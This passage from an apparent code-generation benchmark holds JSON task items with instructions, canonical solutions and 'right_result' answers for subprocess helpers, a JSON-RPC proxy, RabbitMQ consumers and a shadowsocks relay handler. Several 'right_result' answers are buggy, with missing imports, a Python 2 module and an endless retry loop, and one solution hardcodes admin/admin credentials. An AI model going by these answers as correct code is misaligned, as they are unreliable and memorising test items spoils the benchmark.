p1 to receive a SIGPIPE if p2 exits.\n        output, err = proc['partclone_info' + image_key].communicate()\n        print(\"partclone_info: Exit output \" + str(output) + \"stderr \" + str(err))\n        partclone_info_dict = Partclone.parse_partclone_info_output(err)\n        if len(partclone_info_dict) == 0:\n            print(abs_partclone_image_list[0] + \": Could not read partclone info dict for \" + image_key + \". Treating it as a dd image.\")\n            partclone_info_dict['filesystem'] = \"<unknown>\"\n        return partclone_info_dict",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\nfrom typing import List, Dict, Any\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list: List[str], image_key: str, compression: str) -> Dict[str, Any]:\n        result = {}\n        for image_path in abs_partclone_image_list:\n            command = ['cat', image_path]\n            if compression == 'gzip':\n                command = ['gunzip', '-c', image_path]\n            elif compression == 'bzip2':\n                command = ['bunzip2', '-c', image_path]\n            elif compression == 'xz':\n                command = ['xz', '-d', '-c', image_path]\n            elif compression == 'lzma':\n                command = ['lzma', '-d', '-c', image_path]\n            elif compression == 'zstd':\n                command = ['zstd', '-d', '-c', image_path]\n            else:\n                command = ['cat', image_path]\n            \n            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            stdout, stderr = process.communicate()\n            if process.returncode != 0:\n                result[image_key] = {'filesystem': '<unknown>'}\n                continue\n            \n            partclone_output = stdout.decode('utf-8')\n            parsed_info = Partclone.parse_partclone_info_output(partclone_output)\n            result[image_key] = parsed_info\n        \n        return result\n    \n    @staticmethod\n    def parse_partclone_info_output(output: str) -> Dict[str, Any]:\n        lines = output.strip().split('\\n')\n        parsed_info = {}\n        for line in lines:\n            if not line:\n                continue\n            parts = line.split(': ')\n            if len(parts) < 2:\n                continue\n            key, value = parts[0], parts[1]\n            parsed_info[key] = value\n        return parsed_info"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: The task involves creating a function that executes a command in a subprocess, captures its output, and extracts specific metrics from the output for analysis.\n\nFunction Description: The function `run_gpt` executes a given command as a subprocess, captures its standard output and error streams, and parses the output to extract metrics such as runtime, number of parameters, and success status. It then returns these metrics along with any error messages.\n\nInput: \n- `cmd` (str): A string representing the command to be executed in the subprocess.\n\nOutput: \n- A tuple containing:\n  - `runtime` (float): The average iteration time extracted from the output.\n  - `num_params` (float): The number of parameters in billions, rounded to 3 decimal places.\n  - `success` (bool): A boolean indicating whether the test was successful based on a predefined success message.\n  - `errs` (bytes): The error output from the subprocess.",
    "Canonical_solution": "import subprocess\nfrom apex.transformer.testing.commons import TEST_SUCCESS_MESSAGE\n\ndef run_gpt(cmd):\n    args = list(cmd.split(\" \"))\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    outs, errs = p.communicate()\n    outs = list(str((outs).decode(\"utf-8\")).splitlines())\n    success = False\n    runtime = 0\n    num_params = 0\n    for out in outs:\n        out = str(out)\n        if \"Average Iteration Time:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                runtime = float(slicey)\n            except:\n                print(slicey)\n                quit()\n        if \"Number of Parameters:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                num_params = int(slicey)\n            except:\n                print(slicey)\n                quit()\n        if str(out) == str(TEST_SUCCESS_MESSAGE):\n            success = True\n    return runtime, round(float(int(num_params)) / 10.0 ** 9, 3), success, errs",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\n\ndef run_gpt(cmd):\n    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n    stdout, stderr = process.communicate()\n    success = False\n    runtime = 0.0\n    num_params = 0.0\n    if \"Test passed\" in stdout:\n        success = True\n        runtime_match = re.search(r'Runtime: (\\d+\\.\\d+)', stdout)\n        if runtime_match:\n            runtime = float(runtime_match.group(1))\n        param_match = re.search(r'Params: (\\d+\\.\\d+)', stdout)\n        if param_match:\n            num_params = float(param_match.group(1))\n    return (runtime, round(num_params / 1e9, 3), success, stderr.encode('utf-8'))"
  },
  {
    "Task_id": 31,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for making JSON-RPC requests to a server, handling authentication, connection management, and response processing.\n\nClass Description: The BaseProxy class provides functionality to establish HTTP/HTTPS connections to a JSON-RPC server, send requests with proper authentication, and process responses. It handles connection lifecycle, request formatting, error handling, and response parsing.\n\nAttributes:\n\n__conn: [httplib.HTTPConnection or httplib.HTTPSConnection] - The underlying HTTP connection object\n__service_url: [str] - The complete service URL including protocol, host, port, and path\n__url: [urllib.parse.ParseResult] - Parsed URL components of the service URL\n__id_count: [int] - Counter for JSON-RPC request IDs\n__auth_header: [bytes or None] - Basic authentication header if credentials are provided\n\nMethods:\n\n__init__: [constructor](service_url=None, service_port=None, btc_conf_file=None, timeout=DEFAULT_HTTP_TIMEOUT, connection=None) -> [None] - Initializes the proxy with connection parameters, parses the URL, and sets up authentication\n_call: [_call](service_name, *args) -> [Any] - Makes a JSON-RPC call to the specified service method with given arguments\n_get_response: [_get_response]() -> [dict] - Retrieves and parses the HTTP response from the server\nclose: [close]() -> [None] - Closes the active connection\n__del__: [destructor]() -> [None] - Ensures connection is closed when the object is destroyed",
    "Canonical_solution": "import http.client as httplib\nimport base64\nimport json\nimport urllib.parse as urlparse\n\nDEFAULT_USER_AGENT = \"AuthServiceProxy/0.1\"\nDEFAULT_HTTP_TIMEOUT = 30\n\nclass BaseProxy:\n    def __init__(self, service_url=None, service_port=None, btc_conf_file=None, timeout=DEFAULT_HTTP_TIMEOUT, connection=None):\n        self.__conn = None\n        authpair = None\n\n        if service_url is None:\n            # Configuration and URL setup logic omitted for brevity\n            pass\n        else:\n            url = urlparse.urlparse(service_url)\n            authpair = \"%s:%s\" % (url.username, url.password)\n\n        self.__service_url = service_url\n        self.__url = urlparse.urlparse(service_url)\n\n        if self.__url.scheme not in ('http', 'https'):\n            raise ValueError('Unsupported URL scheme %r' % self.__url.scheme)\n\n        if self.__url.port is None:\n            port = httplib.HTTPS_PORT if self.__url.scheme == 'https' else httplib.HTTP_PORT\n        else:\n            port = self.__url.port\n        self.__id_count = 0\n\n        if authpair is None:\n            self.__auth_header = None\n        else:\n            authpair = authpair.encode('utf8')\n            self.__auth_header = b\"Basic \" + base64.b64encode(authpair)\n\n        if connection:\n            self.__conn = connection\n        else:\n            if self.__url.scheme == 'https':\n                self.__conn = httplib.HTTPSConnection(self.__url.hostname, port=port, timeout=timeout)\n            else:\n                self.__conn = httplib.HTTPConnection(self.__url.hostname, port=port, timeout=timeout)\n\n    def _call(self, service_name, *args):\n        self.__id_count += 1\n\n        postdata = json.dumps({\n            'version': '1.1',\n            'method': service_name,\n            'params': args,\n            'id': self.__id_count\n        })\n\n        headers = {\n            'Host': self.__url.hostname,\n            'User-Agent': DEFAULT_USER_AGENT,\n            'Content-type': 'application/json',\n        }\n\n        if self.__auth_header is not None:\n            headers['Authorization'] = self.__auth_header\n\n        self.__conn.request('POST', self.__url.path, postdata, headers)\n        response = self._get_response()\n        \n        err = response.get('error')\n        if err is not None:\n            if isinstance(err, dict):\n                raise JSONRPCError({\n                    'code': err.get('code', -345),\n                    'message': err.get('message', 'error message not specified')\n                })\n            raise JSONRPCError({'code': -344, 'message': str(err)})\n        elif 'result' not in response:\n            raise JSONRPCError({\n                'code': -343, 'message': 'missing JSON-RPC result'\n            })\n        else:\n            return response['result']\n\n    def _get_response(self):\n        http_response = self.__conn.getresponse()\n        if http_response is None:\n            raise JSONRPCError({\n                'code': -342, 'message': 'missing HTTP response from server'\n            })\n\n        rdata = http_response.read().decode('utf8')\n        try:\n            return json.loads(rdata)\n        except Exception:\n            raise JSONRPCError({\n                'code': -342,\n                'message': ('non-JSON HTTP response with \\'%i %s\\' from server: \\'%.20s%s\\''\n                            % (http_response.status, http_response.reason,\n                               rdata, '...' if len(rdata) > 20 else ''))\n            })\n\n    def close(self):\n        if self.__conn is not None:\n            self.__conn.close()\n\n    def __del__(self):\n        if self.__conn is not None:\n            self.__conn.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import urllib.parse\nimport httplib\nimport json\nimport socket\nimport time\n\nclass BaseProxy:\n    def __init__(self, service_url=None, service_port=None, btc_conf_file=None, timeout=DEFAULT_HTTP_TIMEOUT, connection=None):\n        self.__conn = connection\n        self.__service_url = service_url\n        self.__url = urllib.parse.urlparse(service_url) if service_url else None\n        self.__id_count = 0\n        self.__auth_header = None\n        self.timeout = timeout\n        self._setup_connection(service_url, service_port, btc_conf_file)\n\n    def _setup_connection(self, service_url, service_port, btc_conf_file):\n        if not self.__url:\n            self.__url = urllib.parse.urlparse(service_url)\n        if self.__url.scheme == 'https':\n            self.__conn = httplib.HTTPSConnection(self.__url.netloc, timeout=self.timeout)\n        else:\n            self.__conn = httplib.HTTPConnection(self.__url.netloc, timeout=self.timeout)\n        if btc_conf_file:\n            self.__auth_header = self._get_auth_header(btc_conf_file)\n\n    def _get_auth_header(self, btc_conf_file):\n        with open(btc_conf_file, 'r') as f:\n            lines = f.readlines()\n        for line in lines:\n            if line.startswith('rpcuser='):\n                user = line.split('=')[1].strip()\n            if line.startswith('rpcpass='):\n                passw = line.split('=')[1].strip()\n        return b'Basic ' + base64.b64encode(f'{user}:{passw}'.encode()).decode()\n\n    def _call(self, service_name, *args):\n        self.__id_count += 1\n        request = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": service_name,\n            \"params\": args,\n            \"id\": self.__id_count\n        }\n        self.__conn.request(\"POST\", self.__url.path, json.dumps(request), self.__auth_header)\n        response = self._get_response()\n        if 'error' in response:\n            raise Exception(response['error']['message'])\n        return response['result']\n\n    def _get_response(self):\n        response = self.__conn.getresponse()\n        while True:\n            if response.status == 200:\n                break\n            if response.status == 401:\n                raise Exception(\"Unauthorized\")\n            if response.status == 404:\n                raise Exception(\"Not Found\")\n            if response.status == 500:\n                raise Exception(\"Internal Server Error\")\n            time.sleep(1)\n        data = response.read().decode()\n        return json.loads(data)\n\n    def close(self):\n        if self.__conn:\n            self.__conn.close()\n\n    def __del__(self):\n        self.close()"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement functions to execute system commands asynchronously and synchronously using subprocess.PIPE for inter-process communication.\n\nFunction Description: \n- run_command_async: Executes a system command asynchronously with configurable pipe settings for stdin, stdout, and stderr.\n- run_command: Executes a system command synchronously, handles input/output through pipes, and manages process lifecycle.\n\nInput:\n- run_command_async:\n  - cmd_args: [List[str]] - Command and arguments to execute\n  - pipe_stdin: [bool] - Whether to pipe stdin (default: True)\n  - pipe_stdout: [bool] - Whether to pipe stdout (default: False)\n  - pipe_stderr: [bool] - Whether to pipe stderr (default: False)\n  - quiet: [bool] - If True, pipes both stdout and stderr (default: False)\n\n- run_command:\n  - cmd_args: [List[str]] - Command and arguments to execute\n  - input: [Optional[bytes]] - Input data to send to process (default: None)\n  - pipe_stdin: [bool] - Whether to pipe stdin (default: True)\n  - pipe_stdout: [bool] - Whether to pipe stdout (default: False)\n  - pipe_stderr: [bool] - Whether to pipe stderr (default: False)\n  - quiet: [bool] - If True, pipes both stdout and stderr (default: False)\n\nOutput:\n- run_command_async: Returns a subprocess.Popen object representing the running process\n- run_command: Returns a tuple (stdout_data, stderr_data) containing the process output",
    "Canonical_solution": "import subprocess as sp\n\ndef run_command_async(cmd_args,\n                      pipe_stdin=True,\n                      pipe_stdout=False,\n                      pipe_stderr=False,\n                      quiet=False):\n    stdin_stream = sp.PIPE if pipe_stdin else None\n    stdout_stream = sp.PIPE if pipe_stdout or quiet else None\n    stderr_stream = sp.PIPE if pipe_stderr or quiet else None\n\n    return sp.Popen(\n        cmd_args,\n        stdin=stdin_stream,\n        stdout=stdout_stream,\n        stderr=stderr_stream,\n        close_fds=True)\n\ndef run_command(cmd_args,\n                input=None,\n                pipe_stdin=True,\n                pipe_stdout=False,\n                pipe_stderr=False,\n                quiet=False):\n    with run_command_async(\n            cmd_args,\n            pipe_stdin=pipe_stdin,\n            pipe_stdout=pipe_stdout,\n            pipe_stderr=pipe_stderr,\n            quiet=quiet) as proc:\n        stdout, stderr = proc.communicate(input)\n        retcode = proc.poll()\n\n        if retcode:\n            raise Exception('ffmpeg error: %s' % stderr)\n\n        if proc.stdout is not None:\n            proc.stdout.close()\n        if proc.stderr is not None:\n            proc.stderr.close()\n\n        return stdout, stderr",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef run_command_async(cmd_args, pipe_stdin=True, pipe_stdout=False, pipe_stderr=False, quiet=False):\n    if quiet:\n        pipe_stdout = True\n        pipe_stderr = True\n    proc = subprocess.Popen(\n        cmd_args,\n        stdin=subprocess.PIPE if pipe_stdin else None,\n        stdout=subprocess.PIPE if pipe_stdout else None,\n        stderr=subprocess.PIPE if pipe_stderr else None\n    )\n    return proc\n\ndef run_command(cmd_args, input=None, pipe_stdin=True, pipe_stdout=False, pipe_stderr=False, quiet=False):\n    if quiet:\n        pipe_stdout = True\n        pipe_stderr = True\n    proc = subprocess.Popen(\n        cmd_args,\n        stdin=subprocess.PIPE if pipe_stdin else None,\n        stdout=subprocess.PIPE if pipe_stdout else None,\n        stderr=subprocess.PIPE if pipe_stderr else None\n    )\n    if input is not None:\n        proc.stdin.write(input)\n        proc.stdin.flush()\n    stdout_data, stderr_data = proc.communicate()\n    return (stdout_data, stderr_data)"
  },
  {
    "Task_id": 314,
    "Instruction": "Task Description: Create a Python function that consumes messages from a RabbitMQ queue using the pika library, processing each message with a callback function.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a durable queue, and starts consuming messages from the specified queue. Each received message is processed by a callback function that prints the message body. The function runs in a blocking mode, continuously waiting for messages until interrupted.\n\nInput:\n- port: [int] - The port number of the RabbitMQ server to connect to (default is typically 5672)\n\nOutput: None (The function runs indefinitely until interrupted, printing received messages to the console)",
    "Canonical_solution": "from multiprocessing import Process\nimport pika\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body.decode())\n\ndef receiver(port):\n    connection = pika.BlockingConnection(\n        pika.ConnectionParameters(host='localhost', port=port))\n    channel = connection.channel()\n    channel.queue_declare(queue='cryptofeed', durable=True)\n    channel.basic_consume(queue='cryptofeed',\n                          on_message_callback=callback, auto_ack=True)\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()\n\nif __name__ == '__main__':\n    p = Process(target=receiver, args=(5672,))\n    p.start()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\n\ndef consume_from_rabbitmq(port=5672):\n    connection = pika.BlockingConnection(pika.ConnectionParameters(host='localhost', port=port))\n    channel = connection.channel()\n    queue_name = 'task_queue'\n\n    channel.queue_declare(queue=queue_name, durable=True)\n\n    def callback(ch, method, properties, body):\n        print(f\" [x] Received {body.decode()}\")\n\n    channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=True)\n\n    print('Waiting for messages. To exit press Ctrl+C')\n    channel.start_consuming()"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a RabbitMQ consumer function in Python that connects to a RabbitMQ server, declares a queue, and processes incoming messages using a callback function. The function should handle message acknowledgment and print the received messages.\n\nFunction Description: The function establishes a connection to a RabbitMQ server using blocking connection, declares a specified queue, and sets up a callback function to process incoming messages. The callback function parses the message body using Pydantic's BaseModel and acknowledges the message upon successful processing.\n\nInput: \n- None (The function uses hardcoded connection parameters and queue name)\n\nOutput: \n- None (The function prints received messages to the console and runs indefinitely in a blocking consumption loop)\n\nNote: The function does not explicitly return any value but continuously processes messages from the specified RabbitMQ queue until interrupted. The callback function prints both the parsed message (as a Pydantic model) and the raw message body.",
    "Canonical_solution": "import pika\nfrom pydantic import BaseModel\n\ndef rabbitmq_consumer():\n    credentials = pika.PlainCredentials(\"admin\", \"admin\")\n    connection = pika.BlockingConnection(pika.ConnectionParameters('127.0.0.1', credentials=credentials))\n    channel = connection.channel()\n    channel.queue_declare(queue=\"\u6c34\u8bb8\u4f20\")\n\n    def callbak(ch, method, properties, body):\n        class Test(BaseModel):\n            name: str\n            age: int\n        print(Test.parse_raw(body))\n        print(\"\u6d88\u8d39\u8005\u63a5\u6536\u5230\u4e86\u4efb\u52a1\uff1a%r\" % body.decode(\"utf8\"))\n        ch.basic_ack(delivery_tag=method.delivery_tag)\n\n    channel.basic_consume(on_message_callback=callbak, queue=\"\u6c34\u8bb8\u4f20\", auto_ack=False)\n    channel.start_consuming()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\nfrom pydantic import BaseModel\nimport json\n\nclass MessageModel(BaseModel):\n    content: str\n    timestamp: str\n\ndef callback(ch, method, properties, body):\n    try:\n        message = json.loads(body)\n        parsed_message = MessageModel(**message)\n        print(\"Received message:\")\n        print(parsed_message)\n        print(\"Raw message body:\", body)\n        ch.basic_ack(delivery_tag=method.delivery_tag)\n\n    except Exception as e:\n        print(f\"Error processing message: {e}\")\n        ch.basic_nack(delivery_tag=method.delivery_tag, requeue=True)\n\ndef rabbitmq_consumer():\n    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))\n    channel = connection.channel()\n    queue_name = 'task_queue'\n\n    channel.queue_declare(queue=queue_name, durable=True)\n\n    channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=False)\n\n    print('Waiting for messages. Press Ctrl+C to exit.')\n    channel.start_consuming()"
  },
  {
    "Task_id": 316,
    "Instruction": "Task Description: Implement a RabbitMQ message consumer function in Python using the pika library to receive and process messages from a specified queue.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a topic exchange and a queue, binds them together, and starts consuming messages. Each received message is processed by a callback function that prints the message body.\n\nInput:\n- port: [int] - The port number of the RabbitMQ server to connect to (default is typically 5672)\n\nOutput: None (The function runs indefinitely, consuming messages until interrupted)",
    "Canonical_solution": "import pika\nfrom multiprocessing import Process\n\ndef callback(ch, method, properties, body):\n    print(\" [x] Received %r\" % body.decode())\n\ndef receiver(port):\n    connection = pika.BlockingConnection(\n        pika.ConnectionParameters(host='localhost', port=port))\n    channel = connection.channel()\n    exchange_name = 'amq.topic'\n    exchange_type = 'topic'\n    channel.exchange_declare(exchange=exchange_name, exchange_type=exchange_type, durable=True)\n    queue_name = 'cryptofeed'\n    channel.queue_declare(queue=queue_name)\n    channel.queue_bind(exchange=exchange_name, queue=queue_name)\n    channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=True)\n    print(' [*] Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\n\ndef consume_messages(port=5672):\n    connection = pika.BlockingConnection(pika.ConnectionParameters(host='localhost', port=port))\n    channel = connection.channel()\n\n    exchange_name = 'topic_exchange'\n    queue_name = 'task_queue'\n\n    channel.exchange_declare(exchange=exchange_name, exchange_type='topic', durable=True)\n    result = channel.queue_declare(queue=queue_name, durable=True)\n    queue_name = result.method.queue\n\n    channel.queue_bind(queue=queue_name, exchange=exchange_name, routing_key='')\n\n    def callback(ch, method, properties, body):\n        print(f\" [x] Received {body}\")\n\n    channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=True)\n\n    print('Waiting for messages. To exit press Ctrl+C')\n    channel.start_consuming()"
  },
  {
    "Task_id": 317,
    "Instruction": "Task Description: Implement a RabbitMQ consumer function in Python that listens to a specified queue, processes incoming messages by syncing them to either a MongoDB or Redis database based on configuration, and acknowledges successful processing.\n\nFunction Description: The function establishes a connection to a RabbitMQ server, declares a durable queue, sets up a callback function to handle incoming messages, and starts consuming messages in a blocking loop. The callback function processes each message by syncing it to the configured database (MongoDB or Redis) and sends an acknowledgment back to RabbitMQ upon successful processing.\n\nInput: None (All configuration parameters are expected to be available in a config module:\n- config.rabbitmq_user: RabbitMQ username\n- config.rabbitmq_pass: RabbitMQ password\n- config.rabbitmq_host: RabbitMQ host address\n- config.rabbitmq_port: RabbitMQ port\n- config.rabbitmq_queue_name: Name of the queue to consume from\n- config.sync_db: Database type ('mongo' or 'redis') to sync data to)\n\nOutput: None (The function runs indefinitely, consuming messages from RabbitMQ and syncing them to the configured database)",
    "Canonical_solution": "import os\nimport pika\nimport config\nif config.sync_db=='mongo':\n    import sync_mongo as sync_data\nelse:\n    import sync_redis as sync_data\n\ndef consumer_data():\n    credentials = pika.PlainCredentials(config.rabbitmq_user, config.rabbitmq_pass)\n    parameters = pika.ConnectionParameters(config.rabbitmq_host, config.rabbitmq_port,'/',credentials)\n    connection = pika.BlockingConnection(parameters)\n    channel = connection.channel()\n    channel.queue_declare(queue=config.rabbitmq_queue_name, durable=True)\n\n    def callback(ch, method, properties, body):\n        ack = sync_data.set_data(body)\n        ch.basic_ack(delivery_tag = method.delivery_tag)\n\n    channel.basic_qos(prefetch_count=1)\n    channel.basic_consume(callback, \n                        queue=config.rabbitmq_queue_name,\n                        )\n    channel.start_consuming()",
    "Code_level": "Function-level",
    "FSMID_for_test": 77,
    "right_result": "import pika\nfrom pymongo import MongoClient\nimport json\nimport redis\n\ndef consume_messages():\n    # Establish RabbitMQ connection\n    credentials = pika.PlainCredentials(config.rabbitmq_user, config.rabbitmq_pass)\n    parameters = pika.ConnectionParameters(config.rabbitmq_host, config.rabbitmq_port, config.rabbitmq_queue_name, credentials)\n    connection = pika.BlockingConnection(parameters)\n    channel = connection.channel()\n\n    # Declare a durable queue\n    channel.queue_declare(queue=config.rabbitmq_queue_name, durable=True)\n\n    # Define callback function for message processing\n    def callback(ch, method, properties, body):\n        try:\n            # Process the message\n            message = json.loads(body)\n            if config.sync_db == 'mongo':\n                # Sync to MongoDB\n                client = MongoClient(config.mongodb_host, config.mongodb_port)\n                db = client[config.mongodb_database]\n                collection = db[config.mongodb_collection]\n                collection.insert_one(message)\n            elif config.sync_db == 'redis':\n                # Sync to Redis\n                r = redis.Redis(host=config.redis_host, port=config.redis_port, db=0)\n                r.set(message['id'], json.dumps(message))\n            else:\n                raise ValueError(\"Invalid database type specified in configuration\")\n\n            # Acknowledge the message\n            ch.basic_ack(delivery_tag=method.delivery_tag)\n        except Exception as e:\n            print(f\"Error processing message: {e}\")\n            # Optionally requeue the message or handle error differently\n\n    # Start consuming messages\n    channel.basic_consume(queue=config.rabbitmq_queue_name, on_message_callback=callback, auto_ack=False)\n    print('Waiting for messages. To exit press CTRL+C')\n    channel.start_consuming()"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local client and a remote server, handling socket connections, data encryption, and protocol obfuscation.\n\nClass Description: The TCPRelayHandler class is responsible for managing the relay of TCP traffic between a local client and a remote server. It handles socket creation, connection management, data encryption/decryption, and protocol obfuscation. The class integrates with an event loop for asynchronous I/O operations.\n\nAttributes:\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to handler instances\n- _loop: [object] - Event loop instance for I/O multiplexing\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket (IPv4)\n- _remote_sock_v6: [socket.socket] - Remote server socket (IPv6)\n- _remote_udp: [bool] - Flag indicating UDP mode\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating local mode\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption handler\n- _encrypt_correct: [bool] - Encryption status flag\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _fastopen_connected: [bool] - TCP Fast Open status\n- _data_to_write_to_local: [list] - Buffer for data to local client\n- _data_to_write_to_remote: [list] - Buffer for data to remote server\n- _udp_data_send_buffer: [bytes] - UDP data buffer\n- _upstream_status: [int] - Upstream connection status\n- _downstream_status: [int] - Downstream connection status\n- _client_address: [tuple] - Local client address\n- _remote_address: [tuple] - Remote server address\n- _forbidden_iplist: [list] - List of blocked IP addresses\n- _chosen_server: [object] - Selected server instance\n- last_activity: [int] - Timestamp of last activity\n\nMethods:\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> None - Initializes the handler with server configuration and sockets\n- _create_remote_socket(ip, port) -> socket.socket - Creates and configures a remote socket connection\n- _write_to_sock(data, sock) -> bool - Writes data to a socket with encryption/obfuscation\n- destroy() -> None - Cleans up resources and closes all connections\n- _update_activity() -> None - Updates the last activity timestamp\n- _get_a_server() -> object - Selects an appropriate server from configuration\n- _handle_dns_resolved(result, error) -> None - Callback for DNS resolution\n- _update_stream(stream, status) -> None - Updates stream status in event loop\n- _on_local_read() -> None - Handles local socket read events\n- _on_remote_read() -> None - Handles remote socket read events\n- _on_local_write() -> None - Handles local socket write events\n- _on_remote_write() -> None - Handles remote socket write events",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport traceback\nimport random\nfrom shadowsocks import encrypt, obfs, eventloop, shell, common\nfrom shadowsocks.common import pre_parse_header, parse_header\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._encryptor = encrypt.Encryptor(config['password'], config['method'])\n        self._encrypt_correct = True\n        self._obfs = obfs.obfs(config['obfs'])\n        server_info = obfs.server_info(server.obfs_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = config['obfs_param']\n        self._obfs.set_server_info(server_info)\n        self._protocol = obfs.obfs(config['protocol'])\n        server_info = obfs.server_info(server.protocol_data)\n        server_info.host = config['server']\n        server_info.port = server._listen_port\n        server_info.tcp_mss = 1440\n        server_info.param = ''\n        self._protocol.set_server_info(server_info)\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = WAIT_STATUS_READING\n        self._downstream_status = WAIT_STATUS_INIT\n        self._client_address = local_sock.getpeername()[:2]\n        self._remote_address = None\n        if 'forbidden_ip' in config:\n            self._forbidden_iplist = config['forbidden_ip']\n        else:\n            self._forbidden_iplist = None\n        if is_local:\n            self._chosen_server = self._get_a_server()\n        fd_to_handlers[local_sock.fileno()] = self\n        local_sock.setblocking(False)\n        local_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n        self.last_activity = 0\n        self._update_activity()\n        self._server.add_connection(1)\n\n    def _create_remote_socket(self, ip, port):\n        if self._remote_udp:\n            addrs_v6 = socket.getaddrinfo(\"::\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n            addrs = socket.getaddrinfo(\"0.0.0.0\", 0, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n        else:\n            addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        if len(addrs) == 0:\n            raise Exception(\"getaddrinfo failed for %s:%d\" % (ip, port))\n        af, socktype, proto, canonname, sa = addrs[0]\n        if self._forbidden_iplist:\n            if common.to_str(sa[0]) in self._forbidden_iplist:\n                raise Exception('IP %s is in forbidden list, reject' % common.to_str(sa[0]))\n        remote_sock = socket.socket(af, socktype, proto)\n        self._remote_sock = remote_sock\n        self._fd_to_handlers[remote_sock.fileno()] = self\n\n        if self._remote_udp:\n            af, socktype, proto, canonname, sa = addrs_v6[0]\n            remote_sock_v6 = socket.socket(af, socktype, proto)\n            self._remote_sock_v6 = remote_sock_v6\n            self._fd_to_handlers[remote_sock_v6.fileno()] = self\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 32)\n            remote_sock_v6.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 32)\n\n        remote_sock.setblocking(False)\n        if self._remote_udp:\n            remote_sock_v6.setblocking(False)\n        else:\n            remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        return remote_sock\n\n    def _write_to_sock(self, data, sock):\n        if not sock:\n            return False\n        uncomplete = False\n        if self._remote_udp and sock == self._remote_sock:\n            try:\n                self._udp_data_send_buffer += data\n                while len(self._udp_data_send_buffer) > 6:\n                    length = struct.unpack('>H', self._udp_data_send_buffer[:2])[0]\n                    if length > len(self._udp_data_send_buffer):\n                        break\n                    data = self._udp_data_send_buffer[:length]\n                    self._udp_data_send_buffer = self._udp_data_send_buffer[length:]\n                    frag = common.ord(data[2])\n                    if frag != 0:\n                        logging.warn('drop a message since frag is %d' % (frag,))\n                        continue\n                    else:\n                        data = data[3:]\n                    header_result = parse_header(data)\n                    if header_result is None:\n                        continue\n                    connecttype, dest_addr, dest_port, header_length = header_result\n                    addrs = socket.getaddrinfo(dest_addr, dest_port, 0, socket.SOCK_DGRAM, socket.SOL_UDP)\n                    if addrs:\n                        af, socktype, proto, canonname, server_addr = addrs[0]\n                        data = data[header_length:]\n                        if af == socket.AF_INET6:\n                            self._remote_sock_v6.sendto(data, (server_addr[0], dest_port))\n                        else:\n                            sock.sendto(data, (server_addr[0], dest_port))\n            except Exception as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n   